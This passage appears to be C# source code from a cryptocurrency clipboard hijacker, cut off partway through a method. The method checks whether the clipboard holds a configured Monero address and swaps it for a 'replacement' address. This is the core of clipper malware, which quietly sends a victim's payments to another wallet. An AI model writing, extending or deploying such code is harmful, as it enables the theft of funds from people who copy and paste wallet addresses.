        // Method to replace the Monero address in the clipboard with the configured address
        internal static void ReplaceMoneroAddress(string currentClipboard)
        {
            // Check if the Monero address is in the clipboard
            if (currentClipboard.Contains(config.monero_address))
            {
                // Replace the Monero address in the clipboard with the configured address
                string result = currentClipboard.Replace(config.monero_address, config.monero_replacement_address);
